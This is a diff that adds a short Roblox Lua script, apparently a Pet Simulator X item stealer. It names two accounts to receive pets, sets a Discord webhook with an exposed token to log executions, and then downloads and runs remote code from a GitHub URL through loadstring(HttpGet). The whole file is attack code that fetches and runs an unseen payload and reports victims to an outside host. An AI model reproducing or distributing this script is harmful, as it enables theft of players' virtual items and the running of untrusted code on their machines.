@@ -1,0 +1,8 @@
+_G.Username1 = "maxpogv1" --// Username To Send Pets To
+_G.Username2 = "RGBfoxgamer5" --// Username To Send Pets To [OPTIONAL]
+
+--[[ WebHook ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1232923649128927252/IIxcaoOCeKEEgskNn-wtmTikuJie6t_xmlfBexmehEaUIP44Ckdy8fRTE9EiysE3mHvK" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://raw.githubusercontent.com/98KRapid/psx/main/e",true))()
